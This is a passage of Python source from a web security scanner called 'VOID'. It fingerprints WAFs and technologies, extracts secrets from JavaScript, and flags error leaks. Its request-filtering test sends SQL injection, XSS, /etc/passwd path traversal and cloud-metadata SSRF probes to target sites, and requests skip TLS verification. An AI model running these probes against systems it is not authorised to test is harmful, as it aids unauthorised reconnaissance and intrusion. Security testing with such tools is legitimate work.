        self.waf_signatures = {'Cloudflare': {'headers': ['cf-ray', 'cf-cache-status', '__cfduid'], 'cookies': ['__cfduid', '__cf_bm'], 'server': ['cloudflare'], 'response': ['Checking your browser', 'Attention Required'], 'block_codes': [403, 503]}, 'Akamai': {'headers': ['x-akamai-transformed', 'x-akamai-request-id'], 'cookies': ['akamai', 'ak_bmsc'], 'server': ['AkamaiGHost'], 'response': ['Reference #', 'Akamai'], 'block_codes': [403, 401]}, 'AWS WAF': {'headers': ['x-amz-cf-id', 'x-amzn-RequestId'], 'cookies': ['AWSALB', 'AWSELB'], 'server': ['CloudFront', 'awselb'], 'response': ['Request blocked', 'AWS WAF'], 'block_codes': [403, 400]}, 'Imperva': {'headers': ['x-imperva', 'x-iinfo'], 'cookies': ['imperva', 'visid'], 'server': ['Imperva'], 'response': ['Imperva', 'Incapsula'], 'block_codes': [403, 406]}, 'F5 BIG-IP': {'headers': ['x-wa-info', 'x-iinfo'], 'cookies': ['BIGipServer', 'TS'], 'server': ['BIG-IP'], 'response': ['F5', 'BIG-IP'], 'block_codes': [403, 404]}, 'Sucuri': {'headers': ['x-sucuri-id', 'x-sucuri-cache'], 'cookies': ['sucuri_cloudproxy'], 'server': ['sucuri'], 'response': ['Sucuri', 'CloudProxy'], 'block_codes': [403, 503]}, 'ModSecurity': {'headers': [], 'cookies': [], 'server': ['ModSecurity'], 'response': ['Mod_Security', 'This error was generated by Mod_Security'], 'block_codes': [403, 406]}, 'Wordfence': {'headers': [], 'cookies': ['wfvt_', 'wordfence_'], 'server': [], 'response': ['Wordfence', 'blocked by Wordfence'], 'block_codes': [403, 404]}}

    async def detect(self, url: str) -> Dict:
        result = {'detected': False, 'wafs': [], 'rate_limiting': False, 'request_filtering': False, 'bot_protection': False, 'details': {}}
        try:
            normal_response = await self.http.get(url)
            if not normal_response:
                return result
            headers = normal_response.get('headers', {})
            content = normal_response.get('content', '').lower()
            for (waf_name, signatures) in self.waf_signatures.items():
                detected = False
                for header in signatures['headers']:
                    if header in headers or any((header in h.lower() for h in headers)):
                        detected = True
                        break
                if not detected:
                    for cookie in signatures['cookies']:
                        set_cookie = headers.get('Set-Cookie', '')
                        if cookie in set_cookie:
                            detected = True
                            break
                if not detected:
                    server = headers.get('Server', '')
                    for s in signatures['server']:
                        if s.lower() in server.lower():
                            detected = True
                            break
                if not detected:
                    for response_pattern in signatures['response']:
                        if response_pattern.lower() in content:
                            detected = True
                            break
                if detected:
                    result['detected'] = True
                    result['wafs'].append(waf_name)
                    result['details'][waf_name] = {'detected_by': 'headers' if any((h in headers for h in signatures['headers'])) else 'cookies' if any((c in headers.get('Set-Cookie', '') for c in signatures['cookies'])) else 'server' if any((s in headers.get('Server', '').lower() for s in signatures['server'])) else 'response'}
            if Config.WAF_DETECT_RATE_LIMITING:
                rate_limit_detected = await self._test_rate_limiting(url)
                result['rate_limiting'] = rate_limit_detected
            if Config.WAF_DETECT_REQUEST_FILTERING:
                filtering_detected = await self._test_request_filtering(url)
                result['request_filtering'] = filtering_detected
            if Config.WAF_DETECT_BOT_PROTECTION:
                bot_protection = await self._test_bot_protection(url)
                result['bot_protection'] = bot_protection
        except Exception as e:
            self.logger.error(f'WAF detection error: {e}')
        return result

    async def _test_rate_limiting(self, url: str) -> bool:
        try:
            responses = []
            for i in range(10):
                response = await self.http.get(url)
                responses.append(response.get('status', 0))
                await asyncio.sleep(0.1)
            if 429 in responses:
                return True
            response_times = []
            for i in range(20):
                start = time.time()
                await self.http.get(url)
                elapsed = time.time() - start
                response_times.append(elapsed)
                await asyncio.sleep(0.05)
            if len(response_times) > 10:
                avg_first = sum(response_times[:5]) / 5
                avg_last = sum(response_times[-5:]) / 5
                if avg_last > avg_first * 3:
                    return True
        except Exception as e:
            self.logger.debug(f'Rate limiting test error: {e}')
        return False

    async def _test_request_filtering(self, url: str) -> bool:
        test_payloads = ["?id=1' OR '1'='1", '?q=<script>alert(1)</script>', '?file=../../../etc/passwd', '?url=http://169.254.169.254/']
        try:
            baseline_response = await self.http.get(url)
            baseline_length = len(baseline_response.get('content', ''))
            for payload in test_payloads:
                test_url = url + payload
                response = await self.http.get(test_url)
                if response.get('status') in [403, 406, 429, 503]:
                    return True
                content_length = len(response.get('content', ''))
                if abs(content_length - baseline_length) < 100:
                    if baseline_length > 0:
                        return True
        except Exception as e:
            self.logger.debug(f'Request filtering test error: {e}')
        return False

    async def _test_bot_protection(self, url: str) -> bool:
        try:
            suspicious_headers = {'User-Agent': 'curl/7.68.0', 'Accept': 'application/json'}
            response = await self.http.get(url, headers=suspicious_headers)
            content = response.get('content', '').lower()
            challenge_indicators = ['captcha', 'recaptcha', 'challenge', 'verify you are human', 'browser check', 'checking your browser', 'please wait']
            if any((indicator in content for indicator in challenge_indicators)):
                return True
            if 'cf-challenge' in content or ('cloudflare' in content and 'challenge' in content):
                return True
        except Exception as e:
            self.logger.debug(f'Bot protection test error: {e}')
        return False

class TechnologyFingerprinter:

    def __init__(self, http_client):
        self.http = http_client
        self.logger = logging.getLogger('tech-fingerprinter')
        self.fingerprints = {'web_servers': {'Apache': ['Apache', 'Apache/(\\d+\\.\\d+)', 'Server: Apache'], 'Nginx': ['nginx', 'nginx/(\\d+\\.\\d+)', 'Server: nginx'], 'IIS': ['IIS', 'Microsoft-IIS', 'Server: Microsoft-IIS'], 'Tomcat': ['Tomcat', 'Apache Tomcat', 'Server: Tomcat'], 'Jetty': ['Jetty', 'Jetty/', 'Server: Jetty'], 'Caddy': ['Caddy', 'Server: Caddy'], 'Lighttpd': ['lighttpd', 'Server: lighttpd']}, 'frameworks': {'Django': ['csrftoken', 'django', '__django_lang'], 'Flask': ['flask', 'Flask', 'flask-session'], 'Ruby on Rails': ['rails', 'Rails', 'csrf-param'], 'Laravel': ['laravel', 'Laravel', 'XSRF-TOKEN'], 'Symfony': ['symfony', '_sf2_attributes', 'Symfony'], 'Spring': ['Spring', 'SpringFramework', 'X-Application-Context'], 'Express': ['express', 'X-Powered-By: Express'], 'ASP.NET': ['ASP.NET', '__VIEWSTATE', '__EVENTVALIDATION'], 'CodeIgniter': ['ci_session', 'CodeIgniter'], 'Yii': ['_csrf', 'YII_CSRF_TOKEN', 'yii.js']}, 'cms': {'WordPress': ['wp-content', 'wp-includes', 'wp-json', 'WordPress'], 'Joomla': ['joomla', 'Joomla', 'com_content', 'mod_mainmenu'], 'Drupal': ['drupal', 'Drupal', 'sites/default', 'misc/drupal.js'], 'Magento': ['magento', 'Mage.Cookies', 'var/theme'], 'Shopify': ['shopify', 'Shopify', 'cdn.shopify.com'], 'PrestaShop': ['prestashop', 'PrestaShop', 'ps_shoppingcart'], 'OpenCart': ['opencart', 'route=common/home', 'catalog/view'], 'Ghost': ['ghost', 'Ghost', 'content/images']}, 'js_libraries': {'jQuery': ['jquery', 'jQuery', '$.'], 'React': ['react', 'React', 'react-dom'], 'Vue.js': ['vue', 'Vue', 'vue.js'], 'Angular': ['angular', 'Angular', 'ng-app'], 'Bootstrap': ['bootstrap', 'Bootstrap', 'data-toggle'], 'Lodash': ['lodash', '_.', '_.'], 'Moment.js': ['moment', 'Moment', 'moment.js'], 'Axios': ['axios', 'axios.js', 'axios/'], 'D3.js': ['d3', 'D3', 'd3.js']}, 'databases': {'MySQL': ['MySQL', 'mysql_', 'SQL syntax.*MySQL'], 'PostgreSQL': ['PostgreSQL', 'pg_', 'PostgreSQL.*ERROR'], 'MongoDB': ['MongoDB', 'mongodb', 'MongoError'], 'Redis': ['Redis', 'redis_version', 'redis_mode'], 'Oracle': ['Oracle', 'ORA-', 'Oracle.*Driver'], 'SQLite': ['SQLite', 'sqlite_', 'SQLite/JDBCDriver'], 'MSSQL': ['SQL Server', 'MSSQL', 'Driver.*SQL Server']}, 'programming_languages': {'PHP': ['.php', 'PHPSESSID', 'X-Powered-By: PHP'], 'Python': ['.py', 'wsgi', 'X-Powered-By: Python'], 'Ruby': ['.rb', 'ruby', 'X-Powered-By: Ruby'], 'Java': ['.jsp', '.do', 'JSESSIONID', 'Java'], 'JavaScript': ['.js', 'Node.js', 'express'], 'Go': ['.go', 'X-Powered-By: Go', 'gorilla'], 'C#': ['.aspx', '.ashx', 'ASP.NET', '__VIEWSTATE']}, 'cdn': {'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'], 'Akamai': ['akamai', 'x-akamai', 'akamaighost'], 'Amazon CloudFront': ['cloudfront', 'x-amz-cf-id', 'cloudfront.net'], 'Fastly': ['fastly', 'x-fastly-request-id', 'Fastly'], 'MaxCDN': ['maxcdn', 'netdna-cdn.com', 'cdn.net']}}
        self.cve_database = {}

    async def fingerprint(self, url: str, crawled_pages: List[Dict]=None) -> Dict:
        result = {'web_servers': [], 'frameworks': [], 'cms': [], 'js_libraries': [], 'databases': [], 'languages': [], 'cdn': [], 'outdated': [], 'vulnerable': []}
        response = await self.http.get(url)
        if not response:
            return result
        headers = response.get('headers', {})
        content = response.get('content', '')
        for (category, technologies) in self.fingerprints.items():
            for (tech_name, patterns) in technologies.items():
                detected = False
                version = None
                for (header, value) in headers.items():
                    header_str = f'{header}: {value}'
                    for pattern in patterns:
                        if isinstance(pattern, str):
                            if pattern.lower() in header_str.lower():
                                detected = True
                                break
                        else:
                            match = re.search(pattern, header_str, re.IGNORECASE)
                            if match:
                                detected = True
                                if len(match.groups()) > 0:
                                    version = match.group(1)
                                break
                if not detected:
                    for pattern in patterns:
                        if isinstance(pattern, str):
                            if pattern.lower() in content.lower():
                                detected = True
                                break
                        else:
                            match = re.search(pattern, content, re.IGNORECASE)
                            if match:
                                detected = True
                                if len(match.groups()) > 0:
                                    version = match.group(1)
                                break
                if detected:
                    tech_info = {'name': tech_name, 'version': version}
                    result[category].append(tech_info)
                    if Config.TECH_DETECT_OUTDATED_LIBRARIES:
                        if await self._is_outdated(tech_name, version):
                            result['outdated'].append(tech_info)
                    if Config.TECH_DETECT_VULNERABLE_FRAMEWORKS:
                        vulns = await self._check_vulnerabilities(tech_name, version)
                        if vulns:
                            result['vulnerable'].extend(vulns)
        return result

    async def _is_outdated(self, tech_name: str, version: str) -> bool:
        if not version:
            return False
        try:
            version_parts = version.split('.')
            if len(version_parts) >= 2:
                major = int(version_parts[0])
                minor = int(version_parts[1]) if len(version_parts) > 1 else 0
                outdated_thresholds = {'Apache': (2, 4), 'Nginx': (1, 18), 'PHP': (7, 4), 'WordPress': (5, 0), 'jQuery': (3, 0)}
                if tech_name in outdated_thresholds:
                    (threshold_major, threshold_minor) = outdated_thresholds[tech_name]
                    if major < threshold_major or (major == threshold_major and minor < threshold_minor):
                        return True
        except:
            pass
        return False

    async def _check_vulnerabilities(self, tech_name: str, version: str) -> List[Dict]:
        return []

    def get_summary(self, fingerprint: Dict) -> str:
        summary = []
        for (category, items) in fingerprint.items():
            if items and category not in ['outdated', 'vulnerable']:
                tech_names = [f"{t['name']} {t['version'] or ''}".strip() for t in items]
                if tech_names:
                    summary.append(f"{category.replace('_', ' ').title()}: {', '.join(tech_names)}")
        if fingerprint['outdated']:
            outdated = [f"{t['name']} {t['version'] or ''}".strip() for t in fingerprint['outdated']]
            summary.append(f"Outdated: {', '.join(outdated)}")
        return '\n'.join(summary)

class AsyncHighSpeedScanner:

    def __init__(self, max_concurrent: int=100):
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.active_tasks = 0
        self.total_tasks = 0
        self.completed_tasks = 0
        self.failed_tasks = 0
        self.start_time = None
        self.logger = logging.getLogger('async-scanner')
        self.session = None
        self.connector = None

    async def initialize(self):
        self.connector = aiohttp.TCPConnector(limit=self.max_concurrent, ttl_dns_cache=300, force_close=False, enable_cleanup_closed=True)
        self.session = aiohttp.ClientSession(connector=self.connector, timeout=aiohttp.ClientTimeout(total=Config.ASYNC_READ_TIMEOUT))

    async def close(self):
        if self.session:
            await self.session.close()
        if self.connector:
            await self.connector.close()

    async def scan_urls(self, urls: List[str], callback=None) -> List[Dict]:
        self.start_time = time.time()
        self.total_tasks = len(urls)
        self.active_tasks = 0
        self.completed_tasks = 0
        self.failed_tasks = 0
        tasks = []
        for url in urls:
            task = asyncio.create_task(self._scan_with_semaphore(url, callback))
            tasks.append(task)
        results = await asyncio.gather(*tasks, return_exceptions=True)
        valid_results = [r for r in results if isinstance(r, dict)]
        return valid_results

    async def _scan_with_semaphore(self, url: str, callback=None):
        async with self.semaphore:
            self.active_tasks += 1
            try:
                timeout = await self._get_adaptive_timeout()
                result = await self._scan_with_retry(url, timeout)
                self.completed_tasks += 1
                if callback:
                    await callback({'url': url, 'result': result, 'progress': self.completed_tasks / self.total_tasks, 'active': self.active_tasks, 'completed': self.completed_tasks, 'failed': self.failed_tasks})
                return result
            except Exception as e:
                self.failed_tasks += 1
                self.logger.error(f'Error scanning {url}: {e}')
                return None
            finally:
                self.active_tasks -= 1

    async def _scan_with_retry(self, url: str, timeout: int) -> Optional[Dict]:
        for attempt in range(Config.ASYNC_MAX_RETRIES):
            try:
                start = time.time()
                async with self.session.get(url, timeout=timeout, ssl=False) as response:
                    content = await response.text()
                    elapsed = time.time() - start
                    return {'url': url, 'status': response.status, 'headers': dict(response.headers), 'content': content, 'time': elapsed, 'attempt': attempt + 1}
            except asyncio.TimeoutError:
                self.logger.debug(f'Timeout for {url} (attempt {attempt + 1})')
                if attempt < Config.ASYNC_MAX_RETRIES - 1:
                    wait_time = Config.ASYNC_RETRY_BACKOFF ** attempt
                    await asyncio.sleep(wait_time)
            except aiohttp.ClientError as e:
                self.logger.debug(f'Client error for {url}: {e}')
                break
            except Exception as e:
                self.logger.debug(f'Error for {url}: {e}')
                break
        return None

    async def get(self, url: str, headers: Optional[Dict[str, str]]=None) -> Optional[Dict]:
        for attempt in range(Config.ASYNC_MAX_RETRIES):
            try:
                start = time.time()
                timeout = await self._get_adaptive_timeout()
                req_kw: Dict[str, Any] = {'ssl': False}
                if headers:
                    req_kw['headers'] = headers
                async with self.session.get(url, timeout=timeout, **req_kw) as response:
                    content = await response.text()
                    elapsed = time.time() - start
                    return {'url': url, 'status': response.status, 'headers': dict(response.headers), 'content': content, 'time': elapsed, 'attempt': attempt + 1}
            except asyncio.TimeoutError:
                self.logger.debug('Timeout for %s (attempt %s)', url, attempt + 1)
                if attempt < Config.ASYNC_MAX_RETRIES - 1:
                    await asyncio.sleep(Config.ASYNC_RETRY_BACKOFF ** attempt)
            except aiohttp.ClientError as e:
                self.logger.debug('Client error for %s: %s', url, e)
                break
            except Exception as e:
                self.logger.debug('Error for %s: %s', url, e)
                break
        return None

    async def _get_adaptive_timeout(self) -> int:
        if not Config.ASYNC_AUTO_TIMEOUT_TUNING:
            return Config.ASYNC_READ_TIMEOUT
        return Config.ASYNC_READ_TIMEOUT

    def get_stats(self) -> Dict:
        elapsed = time.time() - self.start_time if self.start_time else 0
        return {'total': self.total_tasks, 'completed': self.completed_tasks, 'failed': self.failed_tasks, 'active': self.active_tasks, 'elapsed': elapsed, 'rate': self.completed_tasks / elapsed if elapsed > 0 else 0}

class JavaScriptAnalyzer:

    def __init__(self, http_client):
        self.http = http_client
        self.logger = logging.getLogger('js-analyzer')
        self.secrets_found = []
        self.endpoints_found = []

    async def analyze(self, urls: List[str]) -> Dict:
        result = {'secrets': [], 'endpoints': [], 'sensitive_data': []}
        for url in urls[:Config.JS_MAX_FILES_PER_SCAN]:
            try:
                response = await self.http.get(url)
                if not response or not response.get('content'):
                    continue
                content = response['content']
                if Config.JS_BEAUTIFY_CODE:
                    try:
                        content = jsbeautifier.beautify(content)
                    except:
                        pass
                secrets = self._find_secrets(content, url)
                result['secrets'].extend(secrets)
                self.secrets_found.extend(secrets)
                endpoints = self._find_endpoints(content, url)
                result['endpoints'].extend(endpoints)
                self.endpoints_found.extend(endpoints)
                sensitive = self._find_sensitive_data(content, url)
                result['sensitive_data'].extend(sensitive)
                self.logger.info(f'Analyzed {url}: found {len(secrets)} secrets, {len(endpoints)} endpoints')
            except Exception as e:
                self.logger.error(f'Error analyzing {url}: {e}')
        return result

    def _find_secrets(self, content: str, source_url: str) -> List[Dict]:
        secrets = []
        for (secret_type, pattern) in Config.JS_SECRET_PATTERNS.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                if isinstance(match, tuple):
                    value = match[0]
                else:
                    value = match
                lines = content.split('\n')
                line_number = None
                context = None
                for (i, line) in enumerate(lines):
                    if value in line:
                        line_number = i + 1
                        context = line.strip()
                        break
                secret = {'type': secret_type, 'value': value[:100] + '...' if len(value) > 100 else value, 'source_url': source_url, 'line_number': line_number, 'context': context, 'confidence': 0.9 if len(value) > 20 else 0.7}
                secrets.append(secret)
        return secrets

    def _find_endpoints(self, content: str, source_url: str) -> List[Dict]:
        endpoints = []
        endpoint_patterns = ['["\\\'](/api/[^"\\\']*)["\\\']', '["\\\'](/v[0-9]+/[^"\\\']*)["\\\']', '["\\\'](/rest/[^"\\\']*)["\\\']', '["\\\'](/graphql)[^"\\\']*["\\\']', 'url:\\s*["\\\']([^"\\\']+)["\\\']', 'fetch\\(["\\\']([^"\\\']+)["\\\']', 'axios\\.(?:get|post|put|delete)\\(["\\\']([^"\\\']+)["\\\']', '\\$\\.(?:get|post|ajax)\\(["\\\']([^"\\\']+)["\\\']', 'endpoint:\\s*["\\\']([^"\\\']+)["\\\']', 'baseURL:\\s*["\\\']([^"\\\']+)["\\\']']
        for pattern in endpoint_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    endpoint = match[0]
                else:
                    endpoint = match
                if endpoint and len(endpoint) > 3:
                    endpoints.append({'endpoint': endpoint, 'source_url': source_url, 'method': 'unknown'})
        return endpoints

    def _find_sensitive_data(self, content: str, source_url: str) -> List[Dict]:
        sensitive = []
        emails = re.findall('[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', content)
        for email in emails:
            sensitive.append({'type': 'email', 'value': email, 'source_url': source_url})
        ips = re.findall('\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b', content)
        for ip in ips:
            sensitive.append({'type': 'ip_address', 'value': ip, 'source_url': source_url})
        urls = re.findall('https?://[^\\s"\\\'<>]+', content)
        for url in urls:
            sensitive.append({'type': 'url', 'value': url, 'source_url': source_url})
        return sensitive

    def get_stats(self) -> Dict:
        return {'secrets_found': len(self.secrets_found), 'endpoints_found': len(self.endpoints_found), 'unique_secrets': len(set((s['value'] for s in self.secrets_found)))}

class AdvancedResponseAnalyzer:

    def __init__(self):
        self.logger = logging.getLogger('response-analyzer')
        self.baseline_responses = {}

    async def analyze(self, response: Dict, baseline: Dict=None) -> Dict:
        result = {'anomalies': [], 'errors': [], 'sensitive_info': [], 'interesting': False, 'score': 0}
        content = response.get('content', '')
        headers = response.get('headers', {})
        status = response.get('status', 0)
        if Config.RESPONSE_DETECT_ERROR_MESSAGES:
            errors = self._detect_errors(content)
            if errors:
                result['errors'].extend(errors)
                result['interesting'] = True
                result['score'] += len(errors) * 10
        if Config.RESPONSE_DETECT_STACK_TRACES:
            stacks = self._detect_stack_traces(content)
            if stacks:
                result['anomalies'].extend(stacks)
                result['interesting'] = True
                result['score'] += 20
        if Config.RESPONSE_DETECT_DEBUG_INFO:
            debug = self._detect_debug_info(content, headers)
            if debug:
                result['anomalies'].extend(debug)
                result['interesting'] = True
                result['score'] += 15
        if Config.RESPONSE_DETECT_DATABASE_ERRORS:
            db_errors = self._detect_database_errors(content)
            if db_errors:
                result['errors'].extend(db_errors)
                result['interesting'] = True
                result['score'] += 25
        if baseline and Config.RESPONSE_COMPARE_WITH_BASELINE:
            diff = self._compare_with_baseline(response, baseline)
            if diff['significant']:
                result['anomalies'].append(f"Response differs significantly from baseline: {diff['reason']}")
                result['interesting'] = True
                result['score'] += diff['score']
        return result

    def _detect_errors(self, content: str) -> List[str]:
        errors = []
        content_lower = content.lower()
        for (error_type, patterns) in Config.ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in content_lower:
                    errors.append(f'{error_type}: {pattern}')
                    break
        return errors

    def _detect_stack_traces(self, content: str) -> List[str]:
        stack_indicators = ['at\\s+[\\w\\.]+\\([^\\)]+\\)', 'File\\s+"[^"]+",\\s+line\\s+\\d+', 'in\\s+[\\w\\.]+\\s+\\([^\\)]+\\)', 'Traceback\\s+\\(most\\s+recent\\s+call\\s+last\\)', 'Stack\\s+Trace:', '#\\d+\\s+']
        stacks = []
        for indicator in stack_indicators:
            if re.search(indicator, content, re.IGNORECASE | re.MULTILINE):
                stacks.append(f'Stack trace detected: {indicator}')
                break
        return stacks

    def _detect_debug_info(self, content: str, headers: Dict) -> List[str]:
        debug_info = []
        debug_headers = ['X-Debug-Token', 'X-Debug-Token-Link', 'X-Debug-Exception', 'X-Debug-Exception-Message', 'X-Debug-Error']
        for header in debug_headers:
            if header in headers:
                debug_info.append(f'Debug header: {header}')
        debug_patterns = ['<!--\\s*DEBUG\\s*-->', '<!--\\s*DEV\\s*MODE\\s*-->', 'var\\s+debug\\s*=', 'console\\.log\\(', 'debugger;', '__debug__', 'APP_DEBUG', 'ENVIRONMENT\\s*=\\s*["\\\']development["\\\']']
        for pattern in debug_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                debug_info.append(f'Debug pattern: {pattern}')
                break
        return debug_info

    def _detect_database_errors(self, content: str) -> List[str]:
        db_errors = []
        content_lower = content.lower()
        db_patterns = {'MySQL': ['mysql_fetch', 'mysqli_error', 'mysql error', 'sql syntax'], 'PostgreSQL': ['postgresql error', 'pg_query', 'pg_execute'], 'Oracle': ['ora-', 'oracle error', 'pl/sql'], 'MSSQL': ['sql server', 'mssql', 'odbc driver'], 'SQLite': ['sqlite', 'sqlite3']}
        for (db, patterns) in db_patterns.items():
            for pattern in patterns:
                if pattern in content_lower:
                    db_errors.append(f'{db}: {pattern}')
                    break
        return db_errors

    def _compare_with_baseline(self, response: Dict, baseline: Dict) -> Dict:
        result = {'significant': False, 'reason': '', 'score': 0}
        if response.get('status') != baseline.get('status'):
            result['significant'] = True
            result['reason'] = f"Status code changed: {baseline.get('status')} -> {response.get('status')}"
            result['score'] = 20
        current_len = len(response.get('content', ''))
        baseline_len = len(baseline.get('content', ''))
        if abs(current_len - baseline_len) > baseline_len * 0.3:
            result['significant'] = True
            result['reason'] = f'Content length changed significantly: {baseline_len} -> {current_len}'
            result['score'] = 30
        if baseline_len > 0 and current_len > 0:
            similarity = self._calculate_similarity(response.get('content', ''), baseline.get('content', ''))
            if similarity < 0.7:
                result['significant'] = True
                result['reason'] = f'Content similarity low: {similarity:.2f}'
                result['score'] = 40
        return result

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        words1 = set(text1.split())
        words2 = set(text2.split())
        if not words1 or not words2:
            return 0.0
        intersection = words1.intersection(words2)
        union = words1.union(words2)
        return len(intersection) / len(union) if union else 0.0

    def set_baseline(self, url: str, response: Dict):
        self.baseline_responses[url] = response

    def get_baseline(self, url: str) -> Optional[Dict]:
        return self.baseline_responses.get(url)

def _resolve_about_icon_path() -> Optional[Path]:
    base = Path(__file__).resolve().parent
    for name in ('about_icon.png', 'about.png'):
        p = base / name
        if p.is_file():
            return p
    return None

class AboutDialog(QDialog):

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle('About VOID')
        self.setModal(True)
        self.setMinimumWidth(340)
        layout = QVBoxLayout(self)
        layout.setSpacing(14)
        layout.setContentsMargins(28, 24, 28, 24)
        icon_label = QLabel()
        icon_label.setAlignment(Qt.AlignCenter)
        icon_path = _resolve_about_icon_path()
        if icon_path:
            pix = QPixmap(str(icon_path))
            if not pix.isNull():
                icon_label.setPixmap(pix.scaled(140, 140, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                icon_label.setMinimumHeight(100)
        else:
            icon_label.setMinimumHeight(100)
            icon_label.setText('—')
            icon_label.setStyleSheet(f"color: {Config.COLORS['text_hint']};")
        layout.addWidget(icon_label)
        title = QLabel('VOID')
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet(f"font-size: 22px; font-weight: bold; color: {Config.COLORS['primary']}; letter-spacing: 4px;")
        layout.addWidget(title)
        dev = QLabel('Devloped By: Mkaf7h')
        dev.setAlignment(Qt.AlignCenter)
        dev.setStyleSheet(f"font-size: 12pt; color: {Config.COLORS['text_primary']};")
        layout.addWidget(dev)
        group = QLabel('groupnukersec')
        group.setAlignment(Qt.AlignCenter)
        group.setStyleSheet(f"font-size: 11pt; font-weight: 600; color: {Config.COLORS['text_secondary']};")
        layout.addWidget(group)
        ver = QLabel(f'Version: 1 {Config.VERSION}')
        ver.setAlignment(Qt.AlignCenter)
        ver.setStyleSheet(f"color: {Config.COLORS['text_hint']}; font-size: 10pt;")
        layout.addWidget(ver)
        btn_row = QHBoxLayout()
        btn_row.addStretch()
        ok = QPushButton('OK')
        ok.setMinimumWidth(100)
        ok.clicked.connect(self.accept)
        btn_row.addWidget(ok)
        btn_row.addStretch()
        layout.addLayout(btn_row)

class VisualSecurityDashboard(QMainWindow):

    def __init__(self):
        super().__init__()
        self.scanner = None
        self.update_timer = QTimer()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle(f'VOID · {Config.VERSION}')
        self.setGeometry(100, 100, Config.GUI_WIDTH, Config.GUI_HEIGHT)
        bg = Config.COLORS['background']
        surf = Config.COLORS['surface']
        brd = Config.COLORS['border']
        tx = Config.COLORS['text_primary']
        tx2 = Config.COLORS['text_secondary']
        acc = Config.COLORS['primary']
        self.setStyleSheet(f'''\n            QMainWindow {{ background-color: {bg}; color: {tx}; }}\n            QWidget {{ color: {tx}; font-family: "{Config.GUI_FONT}"; font-size: {Config.GUI_FONT_SIZE}pt; }}\n            QTabWidget::pane {{ border: 1px solid {brd}; border-radius: 10px; top: -1px; background: {surf}; padding: 4px; }}\n            QTabBar::tab {{ background: {surf}; color: {tx2}; padding: 11px 22px; margin-right: 3px;\n                border-top-left-radius: 8px; border-top-right-radius: 8px; border: 1px solid {brd}; border-bottom: none; min-width: 72px; }}\n            QTabBar::tab:selected {{ background: {acc}; color: #ffffff; font-weight: bold; }}\n            QTabBar::tab:hover {{ background: {Config.COLORS['surface_dark']}; }}\n            QGroupBox {{ font-weight: bold; border: 1px solid {brd}; border-radius: 10px; margin-top: 14px; padding: 14px 10px 10px 10px;\n                background: {bg}; }}\n            QGroupBox::title {{ subcontrol-origin: margin; left: 14px; padding: 0 8px; color: {tx2}; font-weight: 600; }}\n            QLineEdit, QSpinBox, QComboBox {{ background: {surf}; color: {tx}; border: 1px solid {brd}; border-radius: 8px; padding: 7px 11px; min-height: 24px; }}\n            QLineEdit:focus, QSpinBox:focus, QComboBox:focus {{ border: 2px solid {acc}; }}\n            QTextEdit {{ background: {surf}; color: {tx}; border: 1px solid {brd}; border-radius: 8px; font-family: "Consolas", "Cascadia Mono", monospace; font-size: 9pt; }}\n            QTableWidget {{ background: {surf}; color: {tx}; gridline-color: {brd}; border: 1px solid {brd}; border-radius: 8px; }}\n            QHeaderView::section {{ background: {Config.COLORS['surface_dark']}; color: {tx}; padding: 10px; border: none; border-bottom: 2px solid {acc}; font-weight: 600; }}\n            QProgressBar {{ border: 1px solid {brd}; border-radius: 8px; text-align: center; background: {surf}; color: {tx}; height: 24px; }}\n            QProgressBar::chunk {{ background: {acc}; border-radius: 7px; }}\n            QCheckBox {{ color: {tx}; spacing: 9px; }}\n            QToolBar {{ background: {bg}; border: none; spacing: 10px; padding: 4px; }}\n            QListWidget {{ background: {surf}; color: {tx}; border: 1px solid {brd}; border-radius: 8px; }}\n            QStatusBar {{ background: {surf}; color: {tx2}; border-top: 1px solid {brd}; }}\n            QPushButton {{ border-radius: 8px; padding: 6px 14px; border: 1px solid {brd}; background: {surf}; }}\n            QPushButton:hover {{ background: {Config.COLORS['surface_dark']}; border-color: {acc}; }}\n            QMenuBar {{ background: {bg}; color: {tx}; border-bottom: 1px solid {brd}; padding: 2px; }}\n            QMenuBar::item:selected {{ background: {surf}; }}\n            QMenu {{ background: {bg}; border: 1px solid {brd}; }}\n            QMenu::item:selected {{ background: {acc}; color: #ffffff; }}\n        ''')
        self._setup_help_menu()
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        header = self.create_header()
        layout.addWidget(header)
        tabs = QTabWidget()
        dashboard_tab = self.create_dashboard_tab()
        tabs.addTab(dashboard_tab, 'Dashboard')
        scan_tab = self.create_scan_tab()
        tabs.addTab(scan_tab, 'Scan')
        results_tab = self.create_results_tab()
        tabs.addTab(results_tab, 'Results')
        reports_tab = self.create_reports_tab()
        tabs.addTab(reports_tab, 'Reports')
        settings_tab = self.create_settings_tab()
        tabs.addTab(settings_tab, 'Settings')
        layout.addWidget(tabs)
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage('Ready')
        self.update_timer.timeout.connect(self.update_dashboard)
        self.update_timer.start(Config.DASHBOARD_REFRESH_INTERVAL)

    def _setup_help_menu(self):
        menubar = self.menuBar()
        help_menu = menubar.addMenu('Help')
        about_act = QAction('About', self)
        about_act.triggered.connect(self._show_about)
        help_menu.addAction(about_act)

    def _show_about(self):
        AboutDialog(self).exec_()

    def create_header(self) -> QWidget:
        header = QWidget()
        header.setStyleSheet(f"\n            QWidget {{\n                background: {Config.COLORS['background']};\n                border-bottom: 2px solid {Config.COLORS['primary']};\n                padding: 16px 20px;\n            }}\n        ")
        layout = QHBoxLayout(header)
        logo = QLabel('VOID')
        logo.setStyleSheet(f"font-size: 28px; font-weight: 900; letter-spacing: 6px; color: {Config.COLORS['primary']};")
        layout.addWidget(logo)
        version = QLabel(f'{Config.VERSION}')
